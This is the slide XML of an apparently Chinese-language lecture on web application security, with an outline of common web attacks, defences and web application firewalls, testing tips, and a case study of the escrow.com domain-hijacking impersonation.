              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>尝试所有的非法访问；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>测试时不要跟随</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>应用的正常工作流；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1">
              <a:solidFill>
                <a:srgbClr val="00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2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82307">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="48230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823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82307">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="17" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="48230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823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82307">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="482307">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823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8230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82310">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="33" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="482310">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823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82310">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="39" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="482310">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823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482310">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="45" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="482310">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823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8" grpId="0"/>
      <p:bldP spid="482309"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2188" y="1437785"/>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en-US" altLang="zh-CN" dirty="0"/>
              <a:t>8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、组合攻击实现网站假冒</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1156538" y="3495185"/>
            <a:ext cx="6743700" cy="2419350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solid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en-US" altLang="zh-CN" dirty="0"/>
              <a:t>8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、组合攻击实现网站假冒</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1077999" y="1338033"/>
            <a:ext cx="7319963" cy="4979640"/>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en-US" altLang="zh-CN" dirty="0"/>
              <a:t>8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、组合攻击实现网站假冒</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="991478" y="1134850"/>
            <a:ext cx="7349923" cy="3590579"/>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051" y="5090883"/>
            <a:ext cx="6991350" cy="723900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="下箭头 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4655220" y="4666501"/>
            <a:ext cx="381015" cy="524221"/>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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="文本框 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="799715" y="5814783"/>
            <a:ext cx="8092021" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>通过查看</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>escrow.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>的域名系统（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>）记录，发现指向的是马来西亚的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Internet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>地址：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>111.90.149.49</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="24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9183" y="1221655"/>
            <a:ext cx="8169303" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击者还从</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Let’s Encrypt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>获得了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>escrow.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的免费加密证书。题外话，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Let’s Encrypt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>证书已经被黑客用的极度泛滥了</a:t>
            </a:r>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8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、组合攻击实现网站假冒</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="509183" y="2974918"/>
            <a:ext cx="8179724" cy="3883082"/>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9183" y="1304782"/>
            <a:ext cx="8169303" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>此外，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>被解析到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>servicenow-godaddy.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>域名</a:t>
            </a:r>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8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、组合攻击实现网站假冒</a:t>
            </a:r>
            <a:endParaRPr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9183" y="142875"/>
            <a:ext cx="8039100" cy="63848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7666" name="Line 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1553830" y="4011796"/>
            <a:ext cx="6253738" cy="31621"/>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1" name="Rectangle 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm rot="3419336">
            <a:off x="1261728" y="1900301"/>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72" name="Text Box 8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1338692" y="1939988"/>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1</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1777673" name="Line 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1536366" y="2482360"/>
            <a:ext cx="6253738" cy="24365"/>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
        <p:nvSpPr>
          <p:cNvPr id="1777674" name="Text Box 10"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2104691" y="1851715"/>
            <a:ext cx="5685413" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="zh-CN"/>
            </a:defPPr>
            <a:lvl1pPr eaLnBrk="0" hangingPunct="0">
              <a:defRPr kumimoji="0" sz="3200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应用体系结构脆弱性分析</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777675" name="Text Box 11"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2122155" y="3421583"/>
            <a:ext cx="5702877" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>常见</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>应用攻击及防范</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="3200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777676" name="Rectangle 12"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>内容提纲</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777679" name="Rectangle 15"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm rot="3419336">
            <a:off x="1279192" y="3448105"/>
            <a:ext cx="479425" cy="520700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="9369E7"/>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1777680" name="Text Box 16"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1356156" y="3468742"/>
            <a:ext cx="301685" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="zh-CN">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm rot="3419336">
            <a:off x="1242678" y="5134070"/>
            <a:ext cx="479425" cy="520700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="669900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>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latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2104690" y="5051566"/>
            <a:ext cx="5685413" cy="579437"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6600"/>
          </a:solidFill>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="zh-CN"/>
            </a:defPPr>
            <a:lvl1pPr eaLnBrk="0" hangingPunct="0">
              <a:defRPr kumimoji="0" sz="3200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应用防火墙</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1346628" y="5165820"/>
            <a:ext cx="301686" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Line 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1522078" y="5673819"/>
            <a:ext cx="6268026" cy="46037"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="C0C0C0"/>
            </a:solidFill>
            <a:prstDash val="sysDot"/>
            <a:round/>
            <a:tailEnd type="oval" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:push dir="d"/>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有了网络防火墙，为什么还不够？</a:t>
